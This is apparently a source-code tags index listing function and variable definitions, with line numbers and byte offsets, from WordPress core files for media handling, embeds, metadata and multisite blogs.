		if ( !is_wp_error($resized_file) && $resized_file && $info = getimagesize($resized_file) ) {info499,18853
			$resized_file = apply_filters('image_make_intermediate_size', $resized_file);resized_file500,18948
function image_get_intermediate_size($post_id, $size='thumbnail') {image_get_intermediate_size537,20344
function image_get_intermediate_size($post_id, $size='thumbnail') {size537,20344
	if ( !is_array( $imagedata = wp_get_attachment_metadata( $post_id ) ) )imagedata538,20412
		foreach ( $imagedata['sizes'] as $_size => $data ) {_size543,20614
				$file = $data['file'];file546,20867
				$data = $imagedata['sizes'][$_size];data557,21305
					$maybe_cropped = image_resize_dimensions($imagedata['width'], $imagedata['height'], $data['width'], $data['height'], false );maybe_cropped561,21619
					$file = $data['file'];file566,22198
	$data = $imagedata['sizes'][$size];data577,22493
		$file_url = wp_get_attachment_url($post_id);file_url580,22648
function get_intermediate_image_sizes() {get_intermediate_image_sizes592,22977
	$image_sizes = array('thumbnail', 'medium', 'large'); // Standard sizesimage_sizes594,23056
		$image_sizes = array_merge( $image_sizes, array_keys( $_wp_additional_image_sizes ) );image_sizes596,23214
function wp_get_attachment_image_src($attachment_id, $size='thumbnail', $icon = false) {wp_get_attachment_image_src613,23801
function wp_get_attachment_image_src($attachment_id, $size='thumbnail', $icon = false) {size613,23801
	if ( $image = image_downsize($attachment_id, $size) )image616,23949
	$src = false;src619,24022
	if ( $icon && $src = wp_mime_type_icon($attachment_id) ) {src621,24038
		$icon_dir = apply_filters( 'icon_dir', ABSPATH . WPINC . '/images/crystal' );icon_dir622,24098
		$src_file = $icon_dir . '/' . wp_basename($src);src_file623,24178
function wp_get_attachment_image($attachment_id, $size = 'thumbnail', $icon = false, $attr = '') {wp_get_attachment_image649,25168
function wp_get_attachment_image($attachment_id, $size = 'thumbnail', $icon = false, $attr = '') {size649,25168
	$html = '';html651,25268
	$image = wp_get_attachment_image_src($attachment_id, $size, $icon);image652,25281
		$hwstring = image_hwstring($width, $height);hwstring655,25407
			$size = join('x', $size);size657,25479
		$attachment =& get_post($attachment_id);attachment658,25508
		$default_attr = array(default_attr659,25551
		$attr = wp_parse_args($attr, $default_attr);attr670,26084
		$attr = apply_filters( 'wp_get_attachment_image_attributes', $attr, $attachment );attr671,26131
		$attr = array_map( 'esc_attr', $attr );attr672,26216
		$html = rtrim("<img $hwstring");html673,26258
		foreach ( $attr as $name => $value ) {name674,26293
			$html .= " $name=" . '"' . $value . '"';name675,26334
 * Adds a 'wp-post-image' class to post thumbnailsto684,26426
function _wp_post_thumbnail_class_filter( $attr ) {_wp_post_thumbnail_class_filter692,26747
function _wp_post_thumbnail_class_filter_add( $attr ) {_wp_post_thumbnail_class_filter_add702,26970
function _wp_post_thumbnail_class_filter_remove( $attr ) {_wp_post_thumbnail_class_filter_remove711,27238
function img_caption_shortcode($attr, $content = null) {img_caption_shortcode734,27987
function img_caption_shortcode($attr, $content = null) {content734,27987
			$content = $matches[1];content738,28272
	$output = apply_filters('img_caption_shortcode', '', $attr, $content);output744,28417
	if ( $id ) $id = 'id="' . esc_attr($id) . '" ';id758,28714
function gallery_shortcode($attr) {gallery_shortcode777,29287
	static $instance = 0;instance780,29339
	static $instance = 0;instance780,29339
	$output = apply_filters('post_gallery', '', $attr);output784,29444
	$id = intval($id);id808,30100
		$orderby = 'none';orderby810,30145
		$include = preg_replace( '/[^0-9,]+/', '', $include );include813,30194
		$_attachments = get_posts( array('include' => $include, 'post_status' => 'inherit', 'post_type' => 'attachment', 'post_mime_type' => 'image', 'order' => $order, 'orderby' => $orderby) );_attachments814,30251
		$attachments = array();attachments816,30441
		foreach ( $_attachments as $key => $val ) {key817,30467
		$exclude = preg_replace( '/[^0-9,]+/', '', $exclude );exclude821,30599
		$attachments = get_children( array('post_parent' => $id, 'exclude' => $exclude, 'post_status' => 'inherit', 'post_type' => 'attachment', 'post_mime_type' => 'image', 'order' => $order, 'orderby' => $orderby) );attachments822,30656
		$attachments = get_children( array('post_parent' => $id, 'post_status' => 'inherit', 'post_type' => 'attachment', 'post_mime_type' => 'image', 'order' => $order, 'orderby' => $orderby) );attachments824,30879
		$output = "\n";output831,31135
		foreach ( $attachments as $att_id => $attachment )att_id832,31153
	$itemtag = tag_escape($itemtag);itemtag837,31295
	$captiontag = tag_escape($captiontag);captiontag838,31329
	$columns = intval($columns);columns839,31369
	$itemwidth = $columns > 0 ? floor(100/$columns) : 100;itemwidth840,31399
	$float = is_rtl() ? 'right' : 'left';float841,31455
	$selector = "gallery-{$instance}";selector843,31495
	$gallery_style = $gallery_div = '';gallery_style845,31532
		$gallery_style = "gallery_style847,31628
	$size_class = sanitize_html_class( $size );size_class866,32037
	$gallery_div = "<div id='$selector' class='gallery galleryid-{$id} gallery-columns-{$columns} gallery-size-{$size_class}'>";gallery_div867,32082
	$output = apply_filters( 'gallery_style', $gallery_style . "\n\t\t" . $gallery_div );output868,32208
	$i = 0;i870,32296
	foreach ( $attachments as $id => $attachment ) {id871,32305
		$link = isset($attr['link']) && 'file' == $attr['link'] ? wp_get_attachment_link($id, $size, false, false) : wp_get_attachment_link($id, $size, true, false);link872,32355
		if ( $columns > 0 && ++$i % $columns == 0 )columns886,32889
function previous_image_link($size = 'thumbnail', $text = false) {previous_image_link905,33426
function previous_image_link($size = 'thumbnail', $text = false) {text905,33426
function next_image_link($size = 'thumbnail', $text = false) {next_image_link917,33898
function next_image_link($size = 'thumbnail', $text = false) {text917,33898
function adjacent_image_link($prev = true, $size = 'thumbnail', $text = false) {adjacent_image_link930,34265
function adjacent_image_link($prev = true, $size = 'thumbnail', $text = false) {size930,34265
	$post = get_post($post);post932,34361
	$attachments = array_values(get_children( array('post_parent' => $post->post_parent, 'post_status' => 'inherit', 'post_type' => 'attachment', 'post_mime_type' => 'image', 'order' => 'ASC', 'orderby' => 'menu_order ID') ));attachments933,34387
	foreach ( $attachments as $k => $attachment )k935,34612
	$k = $prev ? $k - 1 : $k + 1;k939,34708
function get_attachment_taxonomies($attachment) {get_attachment_taxonomies953,35112
		$attachment = get_post($attachment);attachment955,35192
		$attachment = (object) $attachment;attachment957,35266
	$filename = basename($attachment->guid);filename962,35357
	$objects = array('attachment');objects964,35400
	$taxonomies = array();taxonomies976,35856
		if ( $taxes = get_object_taxonomies($object) )taxes978,35913
			$taxonomies = array_merge($taxonomies, $taxes);taxonomies979,35962
function gd_edit_image_support($mime_type) {gd_edit_image_support992,36197
function wp_imagecreatetruecolor($width, $height) {wp_imagecreatetruecolor1024,36958
	$img = imagecreatetruecolor($width, $height);img1025,37010
class WP_Embed {WP_Embed1040,37397
	var $handlers = array();handlers1041,37414
	var $handlers = array();handlers1041,37414
	var $post_ID;post_ID1042,37440
	var $usecache = true;usecache1043,37455
	var $usecache = true;usecache1043,37455
	var $linkifunknown = true;linkifunknown1044,37478
	var $linkifunknown = true;linkifunknown1044,37478
	function __construct() {__construct1049,37533
	 * this function removes all existing shortcodes, registers the [embed] shortcode,removes1071,38315
	function run_shortcode( $content ) {run_shortcode1082,38692
		$orig_shortcode_tags = $shortcode_tags;orig_shortcode_tags1086,38823
		$content = do_shortcode( $content );content1092,39009
		$shortcode_tags = $orig_shortcode_tags;shortcode_tags1095,39087
	function maybe_run_ajax_cache() {maybe_run_ajax_cache1104,39285
	 * Register an embed handler. Do not use this function directly, use {@link wp_embed_register_handler()} instead.directly1122,39663
	 * This function should probably also only be used for sites that do not support oEmbed.should1123,39778
	 * @param callback $callback The callback function that will be called if the regex is matched.that1127,40053
	function register_handler( $id, $regex, $callback, $priority = 10 ) {register_handler1130,40426
	function register_handler( $id, $regex, $callback, $priority = 10 ) {priority1130,40426
	 * Unregister a previously registered embed handler. Do not use this function directly, use {@link wp_embed_unregister_handler()} instead.directly1138,40607
	function unregister_handler( $id, $priority = 10 ) {unregister_handler1143,40909
	function unregister_handler( $id, $priority = 10 ) {priority1143,40909
	function shortcode( $attr, $url = '' ) {shortcode1169,41820
	function shortcode( $attr, $url = '' ) {url1169,41820
		$rawattr = $attr;rawattr1175,41915
		$attr = wp_parse_args( $attr, wp_embed_defaults() );attr1176,41935
		$url = str_replace( '&amp;', '&', $url );url1180,42101
		foreach ( $this->handlers as $priority => $handlers ) {priority1184,42212
			foreach ( $handlers as $id => $handler ) {id1185,42270
					if ( false !== $return = call_user_func( $handler['callback'], $matches, $attr, $url, $rawattr ) )return1187,42416
		$post_ID = ( !empty($post->ID) ) ? $post->ID : null;post_ID1193,42610
			$post_ID = $this->post_ID;post_ID1195,42744
			$cachekey = '_oembed_' . md5( $url . serialize( $attr ) );cachekey1201,42901
				$cache = get_post_meta( $post_ID, $cachekey, true );cache1203,42991
			$html = wp_oembed_get( $url, $attr );html1215,43422
			$cache = ( $html ) ? $html : '{{unknown}}';cache1218,43487
	function delete_oembed_caches( $post_ID ) {delete_oembed_caches1235,43892
		$post_metas = get_post_custom_keys( $post_ID );post_metas1236,43937
	function cache_oembed( $post_ID ) {cache_oembed1251,44300
		$post = get_post( $post_ID );post1252,44337
			$this->post_ID = $post->ID;post_ID1259,44573
			$this->usecache = false;usecache1260,44604
			$content = $this->run_shortcode( $post->post_content );content1262,44633
			$this->usecache = true;usecache1266,44766
	function autoembed( $content ) {autoembed1278,45079
	 * Callback function for {@link WP_Embed::autoembed()}.for1283,45237
	function autoembed_callback( $match ) {autoembed_callback1290,45458
		$oldval = $this->linkifunknown;oldval1291,45499
		$this->linkifunknown = false;linkifunknown1292,45533
		$return = $this->shortcode( array(), $match[1] );return1293,45565
		$this->linkifunknown = $oldval;linkifunknown1294,45617
	 * Conditionally makes a hyperlink based on an internal class variable.variable1300,45685
	function maybe_make_link( $url ) {maybe_make_link1305,45871
		$output = ( $this->linkifunknown ) ? '<a href="' . esc_attr($url) . '">' . esc_html($url) . '</a>' : $url;output1306,45907
 * Register an embed handler. This function should probably only be used for sites that do not support oEmbed.should1313,46131
function wp_embed_register_handler( $id, $regex, $callback, $priority = 10 ) {wp_embed_register_handler1318,46302
function wp_embed_register_handler( $id, $regex, $callback, $priority = 10 ) {priority1318,46302
function wp_embed_unregister_handler( $id, $priority = 10 ) {wp_embed_unregister_handler1329,46589
function wp_embed_unregister_handler( $id, $priority = 10 ) {priority1329,46589
function wp_embed_defaults() {wp_embed_defaults1341,46841
		$theme_width = (int) $GLOBALS['content_width'];theme_width1343,46914
	$width = get_option('embed_size_w');width1345,46965
		$width = $theme_width;width1348,47050
		$width = 500;width1351,47098
	$height = get_option('embed_size_h');height1353,47115
		$height = 700;height1356,47178
 * @uses wp_constrain_dimensions() This function passes the widths and the heights.passes1368,47436
function wp_expand_dimensions( $example_width, $example_height, $max_width, $max_height ) {wp_expand_dimensions1376,47838
	$example_width  = (int) $example_width;example_width1377,47930
	$example_height = (int) $example_height;example_height1378,47971
	$max_width      = (int) $max_width;max_width1379,48013
	$max_height     = (int) $max_height;max_height1380,48050
function wp_oembed_get( $url, $args = '' ) {wp_oembed_get1398,48573
function wp_oembed_get( $url, $args = '' ) {args1398,48573
	$oembed = _wp_oembed_get_object();oembed1400,48674
function wp_oembed_add_provider( $format, $provider, $regex = false ) {wp_oembed_add_provider1416,49136
function wp_oembed_add_provider( $format, $provider, $regex = false ) {regex1416,49136
	$oembed = _wp_oembed_get_object();oembed1418,49264
function wp_maybe_load_embeds() {wp_maybe_load_embeds1430,49580
function wp_embed_handler_googlevideo( $matches, $attr, $url, $rawattr ) {wp_embed_handler_googlevideo1448,50320
		$width  = (int) $rawattr['width'];width1451,50519
		$height = (int) $rawattr['height'];height1452,50556
function wp_plupload_default_settings() {wp_plupload_default_settings1465,51131
	$max_upload_size = wp_max_upload_size();max_upload_size1468,51195
	$defaults = array(defaults1470,51238
	$defaults = apply_filters( 'plupload_default_settings', $defaults );defaults1483,51870
	$params = array(params1485,51941
	$params = apply_filters( 'plupload_default_params', $params );params1489,51999
	$settings = array(settings1493,52162
	$script = 'var _wpPluploadSettings = ' . json_encode( $settings ) . ';';script1501,52316
	$data = $wp_scripts->get_data( 'wp-plupload', 'data' );data1503,52391
		$script = "$data\n$script";script1505,52462

wordpress/wp-includes/meta.php,11961
function add_metadata($meta_type, $object_id, $meta_key, $meta_value, $unique = false) {add_metadata31,1146
function add_metadata($meta_type, $object_id, $meta_key, $meta_value, $unique = false) {unique31,1146
	if ( ! $table = _get_meta_table($meta_type) )table38,1344
	$column = esc_sql($meta_type . '_id');column43,1424
	$meta_key = stripslashes($meta_key);meta_key46,1498
	$meta_value = stripslashes_deep($meta_value);meta_value47,1536
	$meta_value = sanitize_meta( $meta_key, $meta_value, $meta_type );meta_value48,1583
	$check = apply_filters( "add_{$meta_type}_metadata", null, $object_id, $meta_key, $meta_value, $unique );check50,1652
		"SELECT COUNT(*) FROM $table WHERE meta_key = %s AND $column = %d",column55,1850
	$_meta_value = $meta_value;_meta_value59,1967
	$meta_value = maybe_serialize( $meta_value );meta_value60,1996
	$result = $wpdb->insert( $table, array(result64,2121
		$column => $object_id,column65,2162
	$mid = (int) $wpdb->insert_id;mid73,2286
function update_metadata($meta_type, $object_id, $meta_key, $meta_value, $prev_value = '') {update_metadata101,3475
function update_metadata($meta_type, $object_id, $meta_key, $meta_value, $prev_value = '') {prev_value101,3475
	if ( ! $table = _get_meta_table($meta_type) )table108,3677
	$column = esc_sql($meta_type . '_id');column113,3757
	$id_column = 'user' == $meta_type ? 'umeta_id' : 'meta_id';id_column114,3797
	$meta_key = stripslashes($meta_key);meta_key117,3892
	$passed_value = $meta_value;passed_value118,3930
	$meta_value = stripslashes_deep($meta_value);meta_value119,3960
	$meta_value = sanitize_meta( $meta_key, $meta_value, $meta_type );meta_value120,4007
	$check = apply_filters( "update_{$meta_type}_metadata", null, $object_id, $meta_key, $meta_value, $prev_value );check122,4076
	if ( ! $meta_id = $wpdb->get_var( $wpdb->prepare( "SELECT $id_column FROM $table WHERE meta_key = %s AND $column = %d", $meta_key, $object_id ) ) )meta_id126,4239
		$old_value = get_metadata($meta_type, $object_id, $meta_key);old_value131,4584
	$_meta_value = $meta_value;_meta_value138,4748
	$meta_value = maybe_serialize( $meta_value );meta_value139,4777
	$data  = compact( 'meta_value' );data141,4825
	$where = array( $column => $object_id, 'meta_key' => $meta_key );where142,4860
		$prev_value = maybe_serialize($prev_value);prev_value145,4960
function delete_metadata($meta_type, $object_id, $meta_key, $meta_value = '', $delete_all = false) {delete_metadata184,6508
function delete_metadata($meta_type, $object_id, $meta_key, $meta_value = '', $delete_all = false) {meta_value184,6508
	if ( ! $table = _get_meta_table($meta_type) )table191,6736
	$type_column = esc_sql($meta_type . '_id');type_column196,6816
	$id_column = 'user' == $meta_type ? 'umeta_id' : 'meta_id';id_column197,6861
	$meta_key = stripslashes($meta_key);meta_key199,6955
	$meta_value = stripslashes_deep($meta_value);meta_value200,6993
	$check = apply_filters( "delete_{$meta_type}_metadata", null, $object_id, $meta_key, $meta_value, $delete_all );check202,7041
	$_meta_value = $meta_value;_meta_value206,7204
	$meta_value = maybe_serialize( $meta_value );meta_value207,7233
	$query = $wpdb->prepare( "SELECT $id_column FROM $table WHERE meta_key = %s", $meta_key );query209,7281
		$query .= $wpdb->prepare(" AND $type_column = %d", $object_id );type_column212,7395
	$meta_ids = $wpdb->get_col( $query );meta_ids217,7550
		$object_ids = $wpdb->get_col( $wpdb->prepare( "SELECT $type_column FROM $table WHERE meta_key = %s", $meta_key ) );object_ids222,7654
	$query = "DELETE FROM $table WHERE $id_column IN( " . implode( ',', $meta_ids ) . " )";query230,7961
	$count = $wpdb->query($query);count232,8051
function get_metadata($meta_type, $object_id, $meta_key = '', $single = false) {get_metadata267,9103
function get_metadata($meta_type, $object_id, $meta_key = '', $single = false) {meta_key267,9103
	$check = apply_filters( "get_{$meta_type}_metadata", null, $object_id, $meta_key, $single );check274,9279
	$meta_cache = wp_cache_get($object_id, $meta_type . '_meta');meta_cache282,9488
		$meta_cache = update_meta_cache( $meta_type, array( $object_id ) );meta_cache285,9575
		$meta_cache = $meta_cache[$object_id];meta_cache286,9645
function metadata_exists( $meta_type, $object_id, $meta_key ) {metadata_exists315,10307
	if ( ! $object_id = absint( $object_id ) )object_id319,10409
	$check = apply_filters( "get_{$meta_type}_metadata", null, $object_id, $meta_key, true );check322,10470
	$meta_cache = wp_cache_get( $object_id, $meta_type . '_meta' );meta_cache326,10601
		$meta_cache = update_meta_cache( $meta_type, array( $object_id ) );meta_cache329,10690
		$meta_cache = $meta_cache[$object_id];meta_cache330,10760
function get_metadata_by_mid( $meta_type, $meta_id ) {get_metadata_by_mid348,11119
	if ( ! $table = _get_meta_table($meta_type) )table357,11284
	$id_column = ( 'user' == $meta_type ) ? 'umeta_id' : 'meta_id';id_column360,11348
	$meta = $wpdb->get_row( $wpdb->prepare( "SELECT * FROM $table WHERE $id_column = %d", $meta_id ) );meta362,11414
function update_metadata_by_mid( $meta_type, $meta_id, $meta_value, $meta_key = false ) {update_metadata_by_mid387,12186
function update_metadata_by_mid( $meta_type, $meta_id, $meta_value, $meta_key = false ) {meta_key387,12186
	if ( ! $meta_id = absint( $meta_id ) )meta_id394,12365
	if ( ! $table = _get_meta_table( $meta_type ) )table397,12422
	$column = esc_sql($meta_type . '_id');column400,12488
	$id_column = 'user' == $meta_type ? 'umeta_id' : 'meta_id';id_column401,12528
	if ( $meta = get_metadata_by_mid( $meta_type, $meta_id ) ) {meta404,12634
		$original_key = $meta->meta_key;original_key405,12696
		$original_value = $meta->meta_value;original_value406,12731
		$object_id = $meta->{$column};object_id407,12770
			$meta_key = $original_key;meta_key412,12972
		$_meta_value = $meta_value;_meta_value418,13089
		$meta_value = sanitize_meta( $meta_key, $meta_value, $meta_type );meta_value419,13119
		$meta_value = maybe_serialize( $meta_value );meta_value420,13188
		$data = array(data423,13275
		$where = array();where429,13396
		$result = (bool) $wpdb->update( $table, $data, $where, '%s', '%d' );result438,13724
function delete_metadata_by_mid( $meta_type, $meta_id ) {delete_metadata_by_mid467,14546
	if ( ! $meta_id = absint( $meta_id ) )meta_id474,14693
	if ( ! $table = _get_meta_table( $meta_type ) )table477,14750
	$column = esc_sql($meta_type . '_id');column481,14842
	$id_column = 'user' == $meta_type ? 'umeta_id' : 'meta_id';id_column482,14882
	if ( $meta = get_metadata_by_mid( $meta_type, $meta_id ) ) {meta485,14988
		$object_id = $meta->{$column};object_id486,15050
		$result = (bool) $wpdb->delete( $table, array( $id_column => $meta_id ) );result495,15393
function update_meta_cache($meta_type, $object_ids) {update_meta_cache524,16268
	if ( ! $table = _get_meta_table($meta_type) )table528,16391
	$column = esc_sql($meta_type . '_id');column531,16455
		$object_ids = preg_replace('|[^0-9,]|', '', $object_ids);object_ids536,16545
		$object_ids = explode(',', $object_ids);object_ids537,16605
	$object_ids = array_map('intval', $object_ids);object_ids540,16652
	$cache_key = $meta_type . '_meta';cache_key542,16702
	$ids = array();ids543,16738
	$cache = array();cache544,16755
		$cached_object = wp_cache_get( $id, $cache_key );cached_object546,16808
	$id_list = join(',', $ids);id_list557,17013
	$meta_list = $wpdb->get_results( $wpdb->prepare("SELECT $column, meta_key, meta_value FROM $table WHERE $column IN ($id_list)",meta_list558,17042
			$mpid = intval($metarow[$column]);mpid563,17265
			$mkey = $metarow['meta_key'];mkey564,17303
			$mval = $metarow['meta_value'];mval565,17336
function get_meta_sql( $meta_query, $type, $primary_table, $primary_id_column, $context = null ) {get_meta_sql601,18247
function get_meta_sql( $meta_query, $type, $primary_table, $primary_id_column, $context = null ) {context601,18247
	$meta_query_obj = new WP_Meta_Query( $meta_query );meta_query_obj602,18346
 * Container class for a multiple metadata queryfor607,18495
class WP_Meta_Query {WP_Meta_Query611,18567
	public $queries = array();queries627,19225
	public $queries = array();queries627,19225
	public $relation;relation636,19387
	function __construct( $meta_query = false ) {__construct643,19490
	function __construct( $meta_query = false ) {meta_query643,19490
			$this->relation = 'OR';relation648,19664
			$this->relation = 'AND';relation650,19702
		$this->queries = array();queries653,19735
		foreach ( $meta_query as $key => $query ) {key655,19764
	function parse_query_vars( $qv ) {parse_query_vars671,20046
		$meta_query = array();meta_query672,20082
			$meta_query = array_merge( $meta_query, $qv['meta_query'] );meta_query685,20575
	function get_sql( $type, $primary_table, $primary_id_column, $context = null ) {get_sql703,21028
	function get_sql( $type, $primary_table, $primary_id_column, $context = null ) {context703,21028
		if ( ! $meta_table = _get_meta_table( $type ) )meta_table706,21127
		$meta_id_column = esc_sql( $type . '_id' );meta_id_column709,21195
		$join = array();join711,21242
		$where = array();where712,21261
		foreach ( $this->queries as $k => $q ) {k714,21282
			$meta_key = isset( $q['key'] ) ? trim( $q['key'] ) : '';meta_key715,21325
			$meta_type = isset( $q['type'] ) ? strtoupper( $q['type'] ) : 'CHAR';meta_type716,21385
				$meta_type = 'SIGNED';meta_type719,21493
				$meta_type = 'CHAR';meta_type721,21647
			$i = count( $join );i723,21673
			$alias = $i ? 'mt' . $i : $meta_table;alias724,21697
			$meta_value = $q['value'];meta_value741,22153
			$meta_compare = is_array( $meta_value ) ? 'IN' : '=';meta_compare743,22184
				$meta_compare = strtoupper( $q['compare'] );meta_compare745,22274
				$meta_compare = '=';meta_compare748,22466
					$meta_value = preg_split( '/[,\s]+/', $meta_value );meta_value752,22618
				$meta_value = trim( $meta_value );meta_value759,22769
				$meta_compare_string = '(' . substr( str_repeat( ',%s', count( $meta_value ) ), 1 ) . ')';meta_compare_string763,22861
				$meta_value = array_slice( $meta_value, 0, 2 );meta_value765,23014
				$meta_compare_string = '%s AND %s';meta_compare_string766,23066
				$meta_value = '%' . like_escape( $meta_value ) . '%';meta_value768,23162
				$meta_compare_string = '%s';meta_compare_string769,23220
				$meta_compare_string = '%s';meta_compare_string771,23265
		$where = array_filter( $where );where780,23519
			$where = '';where783,23580
			$where = ' AND (' . implode( "\n{$this->relation} ", $where ) . ' )';where785,23603
		$join = implode( "\n", $join );join787,23677
			$join = ' ' . $join;join789,23737
function _get_meta_table($type) {_get_meta_table804,24254
	$table_name = $type . 'meta';table_name807,24304
function is_protected_meta( $meta_key, $meta_type = null ) {is_protected_meta823,24592
function is_protected_meta( $meta_key, $meta_type = null ) {meta_type823,24592
	$protected = ( '_' == $meta_key[0] );protected824,24653
function sanitize_meta( $meta_key, $meta_value, $meta_type ) {sanitize_meta839,24997
 * @param string|array $sanitize_callback A function or method to call when sanitizing the value of $meta_key.or850,25290
 * @param string|array $auth_callback Optional. A function or method to call when performing edit_post_meta, add_post_meta, and delete_post_meta capability checks.or851,25401
function register_meta( $meta_type, $meta_key, $sanitize_callback, $auth_callback = null ) {register_meta854,25601
function register_meta( $meta_type, $meta_key, $sanitize_callback, $auth_callback = null ) {auth_callback854,25601
			$auth_callback = '__return_false';auth_callback860,25908
			$auth_callback = '__return_true';auth_callback862,25953

wordpress/wp-includes/ms-blogs.php,9376
function wpmu_update_blogs_date() {wpmu_update_blogs_date16,230
function get_blogaddress_by_id( $blog_id ) {get_blogaddress_by_id32,546
	$bloginfo = get_blog_details( (int) $blog_id, false ); // only get bare details!bloginfo33,591
function get_blogaddress_by_name( $blogname ) {get_blogaddress_by_name45,893
		if ( $blogname == 'main' )blogname49,998
			$blogname = 'www';blogname50,1027
		$url = rtrim( network_home_url(), '/' );url51,1049
			$url = preg_replace( '|^([^\.]+://)|', '$1' . $blogname . '.', $url );url53,1121
		$url = network_home_url( $blogname );url55,1205
function get_blogaddress_by_domain( $domain, $path ) {get_blogaddress_by_domain69,1426
		$url = "http://" . $domain.$path;url71,1514
			$blogname = substr( $domain, 0, strpos( $domain, '.' ) );blogname74,1604
			$url = 'http://' . substr( $domain, strpos( $domain, '.' ) + 1 ) . $path;url75,1665
			$url = 'http://' . $domain . $path;url80,1866
function get_id_from_blogname( $name ) {get_id_from_blogname94,2082
	$blog_id = wp_cache_get( 'get_id_from_blogname_' . $name, 'blog-details' );blog_id96,2153
		$domain = $name . '.' . $current_site->domain;domain101,2300
		$path = $current_site->path;path102,2349
		$domain = $current_site->domain;domain104,2390
		$path = $current_site->path . $name . '/';path105,2425
	$blog_id = $wpdb->get_var( $wpdb->prepare("SELECT blog_id FROM {$wpdb->blogs} WHERE domain = %s AND path = %s", $domain, $path) );blog_id107,2473
function get_blog_details( $fields, $get_all = true ) {get_blog_details121,3047
function get_blog_details( $fields, $get_all = true ) {get_all121,3047
			$blog_id = $fields['blog_id'];blog_id126,3185
			$key = md5( $fields['domain'] . $fields['path'] );key128,3287
			$blog = wp_cache_get($key, 'blog-lookup');blog129,3341
				$nowww = substr( $fields['domain'], 4 );nowww133,3487
				$blog = $wpdb->get_row( $wpdb->prepare( "SELECT * FROM $wpdb->blogs WHERE domain IN (%s,%s) AND path = %s ORDER BY CHAR_LENGTH(domain) DESC", $nowww, $fields['domain'], $fields['path'] ) );blog134,3532
				$blog = $wpdb->get_row( $wpdb->prepare( "SELECT * FROM $wpdb->blogs WHERE domain = %s AND path = %s", $fields['domain'], $fields['path'] ) );blog136,3738
				$blog_id = $blog->blog_id;blog_id140,3974
			$key = md5( $fields['domain'] );key145,4108
			$blog = wp_cache_get($key, 'blog-lookup');blog146,4144
				$nowww = substr( $fields['domain'], 4 );nowww150,4290
				$blog = $wpdb->get_row( $wpdb->prepare( "SELECT * FROM $wpdb->blogs WHERE domain IN (%s,%s) ORDER BY CHAR_LENGTH(domain) DESC", $nowww, $fields['domain'] ) );blog151,4335
				$blog = $wpdb->get_row( $wpdb->prepare( "SELECT * FROM $wpdb->blogs WHERE domain = %s", $fields['domain'] ) );blog153,4510
				$blog_id = $blog->blog_id;blog_id157,4715
			$blog_id = get_id_from_blogname( $fields );blog_id166,4855
			$blog_id = $fields;blog_id168,4909
	$blog_id = (int) $blog_id;blog_id171,4936
	$all = $get_all == true ? '' : 'short';all173,4965
	$details = wp_cache_get( $blog_id . $all, 'blog-details' );details174,5006
			if ( $details == -1 ) {details178,5122
		$details = wp_cache_get( $blog_id . 'short', 'blog-details' );details192,5420
		$details = wp_cache_get( $blog_id, 'blog-details' );details194,5495
				if ( $details == -1 ) {details198,5672
		$details = $wpdb->get_row( $wpdb->prepare( "SELECT * FROM $wpdb->blogs WHERE blog_id = %d /* get_blog_details */", $blog_id ) );details212,5959
	$details = apply_filters( 'blog_details', $details );details229,6511
	$key = md5( $details->domain . $details->path );key233,6628
function refresh_blog_details( $blog_id ) {refresh_blog_details246,6839
	$blog_id = (int) $blog_id;blog_id247,6883
	$details = get_blog_details( $blog_id, false );details248,6911
function update_blog_details( $blog_id, $details = array() ) {update_blog_details268,7628
function update_blog_details( $blog_id, $details = array() ) {details268,7628
		$details = get_object_vars($details);details275,7776
	$current_details = get_blog_details($blog_id, false);current_details277,7817
	$current_details = get_object_vars($current_details);current_details281,7921
	$details = array_merge($current_details, $details);details283,7977
	$update_details = array();update_details286,8088
	$fields = array( 'site_id', 'domain', 'path', 'registered', 'last_updated', 'public', 'archived', 'mature', 'spam', 'deleted', 'lang_id');fields287,8116
function get_blog_option( $blog_id, $setting, $default = false ) {get_blog_option330,9833
function get_blog_option( $blog_id, $setting, $default = false ) {default330,9833
		$blog_id = $wpdb->blogid;blog_id334,9942
	$key = $blog_id . '-' . $setting . '-blog_option';key336,9971
	$value = wp_cache_get( $key, 'site-options' );value337,10023
	if ( $value == null ) {value338,10071
		if ( $blog_id == $wpdb->blogid ) {blog_id339,10096
			$value = get_option( $setting, $default );value340,10133
			$notoptions = wp_cache_get( 'notoptions', 'options' );notoptions341,10179
				$value = $default;value344,10330
			} elseif ( $value == false ) {value345,10353
			$blog_prefix = $wpdb->get_blog_prefix( $blog_id );blog_prefix352,10593
			$row = $wpdb->get_row( $wpdb->prepare( "SELECT * FROM {$blog_prefix}options WHERE option_name = %s", $setting ) );row353,10647
				$value = $row->option_value;value355,10883
				if ( $value == false )value356,10916
				$value = $default;value362,11183
	} elseif ( $value == 'noop' ) {value365,11215
		$value = $default;value366,11248
	} elseif ( $value == 'falsevalue' ) {value367,11269
		$value = false;value368,11308
		$value = untrailingslashit( $value );value375,11541
function add_blog_option( $id, $key, $value ) {add_blog_option390,11901
	$id = (int) $id;id391,11949
	$return = add_option( $key, $value );return394,11990
function delete_blog_option( $id, $key ) {delete_blog_option410,12355
	$id = (int) $id;id411,12398
	$return = delete_option( $key );return414,12439
function update_blog_option( $id, $key, $value, $deprecated = null ) {update_blog_option431,12835
function update_blog_option( $id, $key, $value, $deprecated = null ) {deprecated431,12835
	$id = (int) $id;id432,12906
	$return = update_option( $key, $value );return438,13025
 * This function is useful if you need to pull posts, or other information,is451,13271
function switch_to_blog( $new_blog, $validate = false ) {switch_to_blog465,13813
function switch_to_blog( $new_blog, $validate = false ) {validate465,13813
		$new_blog = $blog_id;new_blog469,13994
		$switched_stack = array();switched_stack475,14120
	if ( $blog_id == $new_blog ) {blog_id482,14332
		$switched = true;switched484,14414
	$table_prefix = $wpdb->prefix;table_prefix489,14485
	$prev_blog_id = $blog_id;prev_blog_id490,14517
	$blog_id = $new_blog;blog_id491,14544
		$current_user = wp_get_current_user();current_user503,14849
		$global_groups = $wp_object_cache->global_groups;global_groups509,15052
		$global_groups = false;global_groups511,15110
	$switched = true;switched523,15631
function restore_current_blog() {restore_current_blog535,15855
	$blog = array_pop( $switched_stack );blog544,16077
	if ( $blog_id == $blog ) {blog_id545,16116
		$switched = ( is_array( $switched_stack ) && count( $switched_stack ) > 0 );switched548,16278
	$prev_blog_id = $blog_id;prev_blog_id553,16404
	$blog_id = $blog;blog_id554,16431
	$table_prefix = $wpdb->prefix;table_prefix555,16450
		$current_user = wp_get_current_user();current_user567,16764
		$global_groups = $wp_object_cache->global_groups;global_groups573,16967
		$global_groups = false;global_groups575,17025
	$switched = ( is_array( $switched_stack ) && count( $switched_stack ) > 0 );switched589,17636
function is_archived( $id ) {is_archived601,17885
function update_archived( $id, $archived ) {update_archived614,18141
